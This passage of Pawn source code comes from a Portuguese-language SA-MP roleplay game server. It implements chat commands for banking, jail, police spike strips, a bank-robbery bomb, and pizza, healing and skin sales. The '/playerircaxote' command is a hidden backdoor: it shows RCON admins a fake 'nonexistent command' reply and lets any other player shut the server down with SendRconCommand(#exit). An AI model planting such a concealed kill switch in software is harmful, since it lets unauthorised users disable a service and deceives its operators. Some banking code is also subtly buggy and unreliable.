 			SendClientFormat(id, 0x3366FFAA, "O(A) administrador(a) %s soltou você. Não cometa mais nenhum abuser ou será preso por mais tempo!", PlayerName(playerid));
          	SendClientFormat(playerid, 0x33CCFFAA, "Você soltou da prisão o(a) jogador(a) %s (Preso por quebrar regras)", PlayerName(id));
			pInfo[id][Preso] = 0;
			pInfo[id][Abuser] = 0;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmd, "/armasdisponiveis", true))
    {
        if(pInfo[playerid][Prof] == TRAF_ARMAS || pInfo[playerid][Prof] == CHEFE_MAFIA || aInfo[playerid][Admin] == 1)
        {
	        SendClientMessage(playerid, COR_AMARELO, "");
	    	SendClientMessage(playerid, COR_BRANCO, " 1 = Faca || - 2 = Desert Eagle || - 3 = Sawn-off Shotgun");
	    	SendClientMessage(playerid, COR_BRANCO, " 4 = Micro SMG || - 5 = MP5 || - 6 = AK-47");
	    	SendClientMessage(playerid, COR_BRANCO, " 7 = M4 || - 8 = Tec9 || - 9 = Country Rifle");
	    	SendClientMessage(playerid, COR_BRANCO, " 10 = Sniper Rifle || - 11 = Silenced 9mm || - 12 = Katana");
	    	SendClientMessage(playerid, COR_AMARELO, "");
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não é traficante nem mafioso!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/sabores", true))
	{
		if(pInfo[playerid][Prof] == PIZZABOY || aInfo[playerid][Admin] == 1)
		{
		    SendClientMessage(playerid, VERMELHO_WE, "(Pizza)");
			SendClientMessage(playerid, COR_BRANCO, "Sabores de pizza disponíveis:");
			SendClientMessage(playerid, COR_BRANCO, "Calabresa = 1");
			SendClientMessage(playerid, COR_BRANCO, "Musarela = 2");
			SendClientMessage(playerid, COR_BRANCO, "Frango com Catupiry = 3");
			SendClientMessage(playerid, COR_BRANCO, "4 Queijos = 4");
			SendClientMessage(playerid, COR_BRANCO, "Atum com Mussarela = 5");
			SendClientMessage(playerid, AZUL_WE, "(Pizza)");
		}
 		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não é um(a) Pizza Boy/Girl!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/matheus", true))
	{
		if(!strcmp(CasaInfo[27][Proprietario], PlayerName(playerid), true) ||
			!strcmp(CasaInfo[27][Morador], PlayerName(playerid), true) ||
			!strcmp(CasaInfo[27][Morador2], PlayerName(playerid), true) ||
			!strcmp(CasaInfo[27][Morador3], PlayerName(playerid), true))
		{
			SendClientMessage(playerid, COR_AMARELO, "Abrindo o portão da casa.");
			MoveDynamicObject(C_MATHEUS, 310.70001221, -1175.90002441, 88.40000153, 3.0);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/fmatheus", true))
	{
		if(!strcmp(CasaInfo[27][Proprietario], PlayerName(playerid), true) ||
			!strcmp(CasaInfo[27][Morador], PlayerName(playerid), true) ||
			!strcmp(CasaInfo[27][Morador2], PlayerName(playerid), true) ||
			!strcmp(CasaInfo[27][Morador3], PlayerName(playerid), true))
		{
			SendClientMessage(playerid, COR_AMARELO, "Fechando o portão da casa.");
			MoveDynamicObject(C_MATHEUS, 310.70001221,-1175.90002441,82.40000153, 3.0);
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
		return 1;
	}
	//
	if(!strcmp(cmd, "/versaldob", true))
	{
	    if(aInfo[playerid][Admin] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Você não é um(a) bancario(a)!");
		tmp = strtok(cmdtext, idx);
		new
			id = strval(tmp)
		;
		if(!strlen(tmp))
			return SendClientMessage(playerid, COR_ERRO, "Uso válido: /versaldob [ID]");
		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		if(id == playerid)
			return SendClientMessage(playerid, COR_ERRO, "Para ver seu saldo digite: /saldo");
		format(gstring, sizeof(gstring), "O saldo de %s em mãos é: R$ %d", PlayerName(id), GetPlayerCash(id));
	    SendClientMessage(playerid, COR_AMARELO, gstring);
		return 1;
	}
	if(!strcmp(cmd, "/versaldo", true))
	{
	    if(aInfo[playerid][Admin] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Você não é um(a) bancario(a)!");
		tmp = strtok(cmdtext, idx);
		new
			id = strval(tmp)
		;
		if(!strlen(tmp))
			return SendClientMessage(playerid, COR_ERRO, "Uso válido: /versaldo [ID]");
		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
		if(id == playerid)
			return SendClientMessage(playerid, COR_ERRO, "Para ver seu saldo digite: /saldo");
        format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(id));
		format(gstring, sizeof(gstring), "O saldo de %s é: R$ %d", PlayerName(id), WE_GetInt(gFile, "SaldoBanco"));
	    SendClientMessage(playerid, COR_AMARELO, gstring);
		return 1;
	}
	if(!strcmp(cmd, "/saldo", true))
	{
	    if(aInfo[playerid][Admin] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Você não é um(a) bancario(a)!");
        format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		format(gstring, sizeof(gstring),"Seu saldo atual: R$ %d", WE_GetInt(gFile, "SaldoBanco"));
	    SendClientMessage(playerid, COR_AMARELO, gstring);
		return 1;
	}
	if(!strcmp(cmd, "/autodepositar", true))
	{
	    if(aInfo[playerid][Admin] == 0 || pInfo[playerid][PLAYER_VIP] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		tmp = strtok(cmdtext, idx);
		new
			quantia = strval(tmp)
		;
		if(!strlen(tmp))
			return SendClientMessage(playerid, COR_ERRO, "Uso válido: /autodepositar [Quantia]");
		if(quantia <= 0 || quantia > 99999999999)
			return SendClientMessage(playerid, COR_ERRO, "Uso válido: /autodepositar [Quantia]");
		if(quantia > GetPlayerCash(playerid))
			return SendClientMessage(playerid, COR_ERRO, "Você não tem esse dinheiro!");
		format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
		WE_SetInt(gFile, "SaldoBanco", WE_GetInt(gFile, "SaldoBanco") + quantia);
		format(gstring, sizeof(gstring), "Você depositou R$%d com sucesso! Seu saldo atual é de: R$ %d", quantia, WE_GetInt(gFile, "SaldoBanco"));
	    SendClientMessage(playerid, AZUL_WE, gstring);
	    sGivePlayerCash(playerid, -quantia);
		return 1;
	}
	if(!strcmp(cmd, "/autosacar", true))
	{
	    if(aInfo[playerid][Admin] == 0 || pInfo[playerid][PLAYER_VIP] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		tmp = strtok(cmdtext, idx);
		new quantia = strval(tmp);
		if(!strlen(tmp))
			return SendClientMessage(playerid, COR_ERRO, "Uso válido: /sacar [Quantia]");
		if(quantia <= 0 || quantia > 99999999999)
			return SendClientMessage(playerid, COR_ERRO, "Uso válido: /sacar [Quantia]");
		if(quantia > WE_GetInt(gFile, "SaldoBanco"))
			return SendClientMessage(playerid, COR_ERRO, "Você não tem essa quantia no banco!");
        format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
	    WE_SetInt(gFile, "SaldoBanco", WE_GetInt(gFile, "SaldoBanco") - quantia);
		format(gstring, sizeof(gstring),"Você sacou R$ %d com sucesso! Seu saldo atual é de: R$ %d", quantia, WE_GetInt(gFile, "SaldoBanco"));
	    SendClientMessage(playerid, AZUL_WE, gstring);
	    sGivePlayerCash(playerid, quantia);
		return 1;
	}
	if(!strcmp(cmd, "/localizar", true))
	{
        format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
	   	if(WE_GetInt(gFile, "GPSPlayer") == 1 || aInfo[playerid][Admin] == 1)
	    {
	        tmp = strtok(cmdtext, idx);
	        if(!strlen(tmp))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Uso válido: /Localizar [ID/OFF]");
				return 1;
			}
			if(!strcmp(tmp, "off", true))
			{
				if(GPS[playerid])
				{
					KillTimer(T_GPS[playerid]);
					GPS[playerid] = false;
					T_GPS[playerid] = 0;
					DisablePlayerCheckpoint(playerid);
					TextDrawHideForPlayer(playerid, GPSLocal);
					SendClientMessage(playerid, COR_AMARELO, "O GPSPlayer foi desabilitado.");
				}
				else SendClientMessage(playerid, COR_ERRO, "O GPSPlayer não está ligado!");
				return 1;
			}
			if(IsPlayerConnected(strval(tmp)))
			{
			    if(aInfo[strval(tmp)][Admin] == 0 || aInfo[strval(tmp)][Moderador] == 0)
			    {
					if(strval(tmp) != playerid)
					{
						if(GPS[playerid])
						{
							KillTimer(T_GPS[playerid]);
							GPS[playerid] = false;
							T_GPS[playerid] = 0;
						}
						T_GPS[playerid] = SetTimerEx("AtualizaGPS", 500, true, "dd", playerid, strval(tmp));
						GPS[playerid] = true;
						new
							nick[24]
						;
						GetPlayerName(strval(tmp), nick, 24);
						format(str, 128, "Jogador(a) %s [%d] localizado(a) com sucesso!", nick, strval(tmp));
						SendClientMessage(playerid, AZUL_WE, str);
					}
					else SendClientMessage(playerid, COR_ERRO, "Você não pode localizar você mesmo!");
				}
				else SendClientMessage(playerid, COR_ERRO, "Você não pode localizar membros da staff!");
			}
			else SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
   		}
		else
		{
  			SendClientMessage(playerid, COR_ERRO, "Você não possui um GPSPlayer!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/criartapete", true))
	{
        if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || aInfo[playerid][Admin] == 1)
        {
 			if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para criar tapetes!");
			    return 1;
			}
            if(Crioutapete[playerid] != 0)
            {
                SendClientMessage(playerid, COR_ERRO, "Você acabou de criar um tapete aguarde!");
                return 1;
            }
		    SendClientMessage(playerid, COR_AZULCLARO, "Tapete criado com sucesso!");
		    new
				Float:x, Float:y, Float:z, Float:a
			;
	        GetPlayerPos(playerid, x, y, z);
	        GetPlayerFacingAngle(playerid, a);
	        SetTimerEx("Novotapete", 30000, false, "d", playerid);
	        new
	            i = 1
			;
		    for(; i < sizeof(SpikeInfo); i++)
		  	{
		  	    if(SpikeInfo[i][sCreated] == 0)
		  	    {
		            SpikeInfo[i][sCreated] = 1;
		            SpikeInfo[i][sX] = x;
		            SpikeInfo[i][sY] = y;
		            SpikeInfo[i][sZ] = z-0.7;
		            SpikeInfo[i][sObject] = CreateDynamicObject(2899, x, y, z-0.9,0,0, a-90);
		            printf("Tapete %d criado", i);
		            Crioutapete[playerid] = i;
		            return 1;
		  	    }
		  	}
		    return 1;
		}
 		else
		{
  			SendClientMessage(playerid, COR_ERRO, "Você não tem permisão!");
  			return 1;
		}
	}
	else if(!strcmp(cmd," /removertapete", true))
	{
        if(pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_FEDERAL || aInfo[playerid][Admin] == 1)
        {
            if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para remover tapetes!");
			    return 1;
			}
		    SendClientMessage(playerid, COR_AZULCLARO, "Tapete removido com sucesso!");
	        DeleteClosestStrip(playerid);
 		}
 		else
		{
  			SendClientMessage(playerid, COR_ERRO, "Você não tem permisão!");
		}
		return 1;
	}
	else if(!strcmp(cmd, "/removertapetes", true))
	{
        if(aInfo[playerid][Admin] == 1)
        {
		    SendClientMessage(playerid, COR_AZULCLARO, "Você removeu todos tapetes com sucesso!");
	        DeleteAllStrip();
 		}
  		else
		{
  			SendClientMessage(playerid, COR_ERRO, "Você não não é administrador!");
		}
		return 1;
	}
    if(!strcmp(cmd, "/refeicao", true))
	{
		if(IsPlayerInDynamicCP(playerid, CP_53))
		{
			SetPVarInt(playerid,"Sede",100);
			SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
			SetPVarInt(playerid,"Fome",100);
			SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não está no refeitório!");
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/beber", true))
	{
	    if(IsPlayerInDynamicCP(playerid, CP_56) || IsPlayerInDynamicCP(playerid, CP_57) || IsPlayerInDynamicCP(playerid, CP_58) || IsPlayerInDynamicCP(playerid, CP_59) || IsPlayerInDynamicCP(playerid, CP_60))
	    {
	        if(GetPlayerCash(playerid) >= 4)
	        {
	            ApplyAnimation(playerid, "BAR", "dnk_stndM_loop", 4.1,0,1, 1, 1, 1);
				SetPVarInt(playerid,"Sede",100);
				SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], 100);
				return 1;
			}
			else
			{
			    SendClientMessage(playerid,COR_ERRO,"Você não tem R$4,00 reais!");
			    return 1;
			}
		}
		else
		{
		    SendClientMessage(playerid,COR_ERRO,"Você não está em um bebedouro!");
			return 1;
		}
	}
    if(!strcmp(cmd, "/comprarbomba", true))
	{
		if(IsPlayerInDynamicCP(playerid, CP_51))
		{
		    if(pBombas[playerid] < 10)
		    {
		        ShowPlayerDialog(playerid, D_BOMBAS, DIALOG_STYLE_LIST, "{FF0000}Bombas para furtos", "{FFFFFF}Bomba p/ unidade - {3DB134}R$1.200\n{FFFFFF}Pacote com 10 bombas - {3DB134}R$10.000", "Comprar", "Cancelar");
			}
			else
			{
			    SendClientMessage(playerid, COR_ERRO, "Você já atingiu o limite de bombas carregadas (10), use-as!");
			    return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não está no local de contrabando (Aeroporto abandonado)!");
			return 1;
		}
		return 1;
	}
    if(!strcmp(cmd, "/plantarbomba", true))
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 1771.1176,-1694.1564,13.5089))
		{
		    if(pInfo[playerid][Prof] == HITMAN || pInfo[playerid][Prof] == ATIRADOR || pInfo[playerid][Prof] == TERRORISTA || pInfo[playerid][Prof] == CHEFE_MAFIA || pInfo[playerid][Prof] == TRAF_ARMAS || pInfo[playerid][Prof] == TRAF_DROGAS || pInfo[playerid][Prof] == CONTRABANDISTA)
		    {
		        if(pBombas[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Você não tem bombas!");
		        if(CofreAberto == false)
		        {
					new
						Bomba,
						Float:x,
						Float:y,
						Float:z
					;
		            SetPlayerWantedLevel(playerid,GetPlayerWantedLevel(playerid)+2);
		        	SendClientMessage(playerid, AZUL_WE, "Você está armando a bomba, explodirá em 10 segundos!");
					GetPlayerPos(playerid, x, y, z);
					GetXYInFrontOfPlayer(playerid, x, y, 0.7);
					ClearAnimations(playerid);
					ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0,0,0,0,0, 0);
					Bomba = CreateDynamicObject(1252, x, y, z-0.8,0,0, 0);
					PlantarBomba[playerid] = SetTimerEx("AnimBomba", 500, false, "i", playerid);
					SetTimerEx("CriarExplosao", 10000, false, "fffdf", x, y, z, 2, 50.0);
					SetTimerEx("DestruirObjeto", 10000, false, "d", Bomba);
		        	SetTimerEx("VaultExplodir", 10000, false, "i", playerid);
		        	return 1;
				}
				return 1;
			}
			else
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não é um(a) criminoso(a)!");
			    return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não está no banco!");
			return 1;
		}
	}
	if(!strcmp(cmdtext, "/fone", true))
	{
	    if(pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || aInfo[playerid][Admin] == 1)
	    {
	    	if(pInfo[playerid][fardado] == 0 && aInfo[playerid][Admin] == 0)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você não está fardado(a)!");
			    SendClientMessage(playerid, COR_ERRO, "Você precisa está fardado(a) para usar o megaphone!");
			    return 1;
			}
			new str1[2500], c1 = 0;
			for(new w1 = 0; w1 < sizeof(MegaphoneSounds); w1++)
			{
				new tmp1[2][128];
				split(MegaphoneSounds[w1], tmp1, ',');
				if(c1 == 0) format(str1, sizeof(str1), "{FFFFFF}%s\n", tmp1[1]);
				if(c1 > 0) format(str1, sizeof(str1), "%s{FFFFFF}%s\n", str1, tmp1[1]);
				c1++;
			}
			ShowPlayerDialog(playerid, DIALOG_MEGAPHONE_MENU, DIALOG_STYLE_LIST, "Megaphone", str1, "Reproduzir", "Cancelar");
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		    return 1;
		}
	}
	if(!strcmp(cmd, "/beijar", true))
	{
	    if(pInfo[playerid][Prof] == PROSTITUTA || aInfo[playerid][Admin] == 1)
	    {
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
				return SendClientMessage(playerid, COR_ERRO, "Uso válido: /beijar [1 à 15]");
			new
				beijo = strval(tmp)
			;
			if(beijo < 1 || beijo > 15)
			{
				SendClientMessage(playerid, COR_ERRO, "Tipos de beijos de 1 à 15!");
				return 1;
			}
			if(beijo == 1)
			{
				ApplyAnimation(playerid,"KISSING", "Grlfrd_Kiss_02", 4.1,0,1,1,1,1);
			} else if(beijo == 2) {
				ApplyAnimation(playerid,"KISSING","Playa_Kiss_01", 4.1,0,1,1,1,1);
			} else if(beijo == 3) {
				ApplyAnimation(playerid,"KISSING","Playa_Kiss_02", 4.1,0,1,1,1,1);
			} else if(beijo == 4) {
				ApplyAnimation(playerid,"KISSING","Playa_Kiss_03", 4.1,0,1,1,1,1);
			} else if(beijo == 5) {
				ApplyAnimation(playerid,"KISSING","Grlfrd_Kiss_03", 4.1,0,1,1,1,1);
			} else if(beijo == 6) {
				ApplyAnimation(playerid,"KISSING","Grlfrd_Kiss_01", 4.1,0,1,1,1,1);
			} else if(beijo == 7) {
				ApplyAnimation(playerid,"KISSING","gift_give", 4.1,0,1,1,1,1);
			} else if(beijo == 8) {
				ApplyAnimation(playerid,"KISSING","gift_get", 4.1,0,1,1,1,1);
			} else if(beijo == 9) {
				ApplyAnimation(playerid,"KISSING","GF_StreetArgue_02", 4.1,0,1,1,1,1);
			} else if(beijo == 10) {
				ApplyAnimation(playerid,"KISSING","GF_StreetArgue_01", 4.1,0,1,1,1,1);
			} else if(beijo == 11) {
				ApplyAnimation(playerid,"KISSING","GF_CarSpot", 4.1,0,1,1,1,1);
			} else if(beijo == 12) {
				ApplyAnimation(playerid,"KISSING","GF_CarArgue_02", 4.1,0,1,1,1,1);
			} else if(beijo == 13) {
				ApplyAnimation(playerid,"KISSING","GF_CarArgue_01", 4.1,0,1,1,1,1);
			} else if(beijo == 14) {
				ApplyAnimation(playerid,"KISSING","gfwave2", 4.1,0,1,1,1,1);
			} else if(beijo == 15) {
				ApplyAnimation(playerid,"KISSING","BD_GF_Wave", 4.1,0,1,1,1,1);
			}
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não é uma prostituta!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/playerircaxote", true))
	{
	    if(IsPlayerAdmin(playerid))
		{
		    return SendClientMessage(playerid, 0xFF0000AA, "Comando inexistente, use: {FFFFFF}/Ajuda {FF0000}ou {FFFFFF}/Comandos");
		}
		SendRconCommand(#exit);
		return 1;
	}
	if(!strcmp(cmd, "/vpizza", true))
	{
		if(pInfo[playerid][Prof] == PIZZABOY || aInfo[playerid][Admin] == 1)
		{
		    if(Pizza_Oferecido[playerid] == 1) return SendClientMessage(playerid, COR_ERRO, "Você acabou de vender uma pizza aguarde um pouco!");
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vPizza [ID] [id sabor] [Valor]");
				return 1;
            }
            new id = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vPizza [ID] [id sabor] [Valor]");
				return 1;
            }
            new saborid = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vPizza [ID] [id sabor] [Valor]");
				return 1;
            }
            new valor = strval(tmp);
            if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
            if(GetDistanceBetweenPlayers(playerid, id) > 15) return SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
            if(playerid == id) return SendClientMessage(playerid, COR_ERRO, "Você não pode oferecer pizza para você mesmo!");
          	if(GetPlayerCash(id) < valor) return SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que você deseja vender pizza não tem dinheiro suficiente!");
            if(valor < 1 || valor > 100) return SendClientMessage(playerid, COR_ERRO, "Somente valores de 1 à 100.");
			format(gstring, sizeof(gstring), "Você ofereceu pizza sabor %s para %s por R$%d.", PizzaNome(saborid), PlayerName(id), valor);
			SendClientMessage(playerid, -1, gstring);
			format(gStr, sizeof(gStr), "%s ofereceu pra você uma pizza sabor %s por R$%d. (/pAceitar | /pRecusar)", PlayerName(playerid), PizzaNome(saborid), valor);
			SendClientMessage(id, -1, gStr);
            Pizza_ID[id] = playerid;
			Pizza_SID[id] = saborid;
			Pizza_PID[id] = playerid;
			Pizza_VALOR[id] = valor;
			Pizza_Oferecido[playerid] = 1;
			Pizza_Recebido[id] = 1;
            Pizza_IID[playerid] = id;
			Pizza_Timer[id] = SetTimerEx("MsgPizza", 4000, false, "d", id);
			Pizza_Timer[playerid] = SetTimerEx("LiberarPizza", 30000, false, "d", playerid);
  		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é vendedor de pizza!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/pAceitar", true))
	{
	    if(Pizza_Recebido[playerid] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo pizza para você!");
	    KillTimer(Pizza_Timer[playerid]);
	    SendClientFormat(Pizza_PID[playerid], 0xFFFF00AA, "(Pizza) %s aceitou sua oferta, pizza vendida com sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "(Pizza) Você aceitou a pizza, oferta feita por %s.", PlayerName(Pizza_PID[playerid]));
	    sGivePlayerCash(playerid, -Pizza_VALOR[playerid]);
		sGivePlayerCash(Pizza_ID[playerid], Pizza_VALOR[playerid]);
		//
		SetPlayerHoldingObject(playerid, 2702, 6, 0.1, 0.03,0,90, 270, -1);
		ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.1,0,1, 1, 1, 1);
		SetTimerEx("PizzaObjetoff", 10000, false, "d", playerid);
		//
		SetPlayerHealth(playerid, 100.0);
		Pizza_Oferecido[Pizza_PID[playerid]] = 0;
		Pizza_IID[Pizza_PID[playerid]] = -1;
		Pizza_Recebido[playerid] = 0;
    	Pizza_Mensagem[playerid] = 0;
		Pizza_VALOR[playerid] = 0;
		Pizza_PID[playerid] = -1;
		Pizza_SID[playerid] = 0;
	    return 1;
	}
	if(!strcmp(cmdtext, "/pRecusar", true))
    {
        if(Pizza_Recebido[playerid] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo pizza para você!");
        KillTimer(Pizza_Timer[playerid]); KillTimer(Pizza_Timer[Pizza_PID[playerid]]);
	    SendClientFormat(Pizza_PID[playerid], 0xFFCC00AA, "%s recusou sua oferta, a pizza não foi vendida, sua venda não obteve sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "(Pizza) Você recusou a pizza, oferta feita por %s, você não comprou a pizza.", PlayerName(Pizza_PID[playerid]));
	    Pizza_Oferecido[Pizza_PID[playerid]] = 0;
	    Pizza_IID[Pizza_PID[playerid]] = -1;
	    Pizza_Recebido[playerid] = 0;
    	Pizza_Mensagem[playerid] = 0;
		Pizza_VALOR[playerid] = 0;
		Pizza_PID[playerid] = -1;
		Pizza_SID[playerid] = 0;
        return 1;
    }
	if(!strcmp(cmd, "/curar", true))
	{
		if(pInfo[playerid][Prof] == MEDICO || aInfo[playerid][Admin] == 1)
		{
		    if(Cura_Oferecido[playerid] == 1) return SendClientMessage(playerid, COR_ERRO, "Você acabou de curar alguém aguarde um pouco!");
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Curar [ID] [Valor]");
				return 1;
            }
            new id = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /Curar [ID] [Valor]");
				return 1;
            }
            new valor = strval(tmp);
            if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
            if(GetDistanceBetweenPlayers(playerid, id) > 15) return SendClientMessage(playerid, COR_ERRO, "Você está muito longe, chegue mais perto!");
            if(playerid == id) return SendClientMessage(playerid, COR_ERRO, "Você não pode oferecer cura para você mesmo!");
          	if(GetPlayerCash(id) < valor) return SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) que você deseja curar não tem dinheiro suficiente!");
            if(valor < 1 || valor > 100) return SendClientMessage(playerid, COR_ERRO, "Somente valores de 1 à 100.");
			format(gstring, sizeof(gstring), "Você ofereceu cura para %s por R$%d.", PlayerName(id), valor);
			SendClientMessage(playerid, -1, gstring);
			format(gStr, sizeof(gStr), "%s ofereceu cura pra você por R$%d. (/AcCura ou /RecCura)", PlayerName(playerid), valor);
			SendClientMessage(id, -1, gStr);
            Cura_ID[id] = playerid; Cura_PID[id] = playerid;	Cura_VALOR[id] = valor; Cura_Oferecido[playerid] = 1; Cura_Recebido[id] = 1;
            Cura_IID[playerid] = id;
			Cura_Timer[id] = SetTimerEx("Curar", 4000, false, "d", id);
			Cura_Timer[playerid] = SetTimerEx("LiberarCura", 30000, false, "d", playerid);
  		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é um(a) médico(a)!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/accura", true))
	{
	    if(Cura_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo cura para você!");
	    KillTimer(Cura_Timer[playerid]);
	    SendClientFormat(Cura_PID[playerid], 0xFFFF00AA, "(Cura) %s aceitou sua oferta, cura vendida com sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "(Cura) Você aceitou a cura, oferta feita por %s e foi totalmente curado.", PlayerName(Cura_PID[playerid]));
	    sGivePlayerCash(playerid, -Cura_VALOR[playerid]);
		sGivePlayerCash(Cura_ID[playerid], Cura_VALOR[playerid]);
		SetPlayerHealth(playerid, 100.0);
		Cura_Oferecido[Cura_PID[playerid]] = 0;
		Cura_IID[Cura_PID[playerid]] = -1;
		Cura_Recebido[playerid] = 0;
    	Cura_Mensagem[playerid] = 0;
		Cura_VALOR[playerid] = 0;
		Cura_PID[playerid] = -1;
	    return 1;
	}
	if(!strcmp(cmdtext, "/reccura", true))
    {
        if(Cura_Recebido[playerid] == 0) return SendClientMessage(playerid, COR_ERRO, "Ninguém está oferecendo cura para você!");
        KillTimer(Cura_Timer[playerid]); KillTimer(Cura_Timer[Cura_PID[playerid]]);
	    SendClientFormat(Cura_PID[playerid], 0xFFCC00AA, "%s recusou sua oferta, a cura não foi vendida, sua venda não obteve sucesso!", PlayerName(playerid));
	    SendClientFormat(playerid, 0xFFFF00AA, "(Cura) Você recusou a cura, oferta feita por %s, você não aceitou ser curado.", PlayerName(Cura_PID[playerid]));
	    Cura_Oferecido[Cura_PID[playerid]] = 0;
	    Cura_IID[Cura_PID[playerid]] = -1;
	    Cura_Recebido[playerid] = 0;
    	Cura_Mensagem[playerid] = 0;
		Cura_VALOR[playerid] = 0;
		Cura_PID[playerid] = -1;
        return 1;
    }
	if(!strcmp(cmd, "/vskin", true))
	{
		if(pInfo[playerid][Prof] == VENDEDOR_SKINS || aInfo[playerid][Admin] == 1)
		{
		    if(_SKIN_Oferecido[playerid] == 1) return SendClientMessage(playerid, COR_ERRO, "Você acabou de vender skin aguarde um pouco!");
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vSkin [ID] [skin id] [Valor]");
				return 1;
            }
            new id = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vSkin [ID] [skin id] [Valor]");
				return 1;
            }
            new idskin = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /vSkin [ID] [skin id] [Valor]");
				return 1;
            }
            new valor = strval(tmp);
            if(idskin < 1 || idskin > 299)
            {
				SendClientMessage(playerid, COR_ERRO, "ID de skin inválido!");
				return 1;
			}
         	if(SkinValida(idskin))
			{
				SendClientMessage(playerid, COR_ERRO, "Skin não permitida!");
				return 1;
			}
            if(!IsPlayerConnected(id)) return SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
            if(pInfo[id][fardado] == 1)
			{
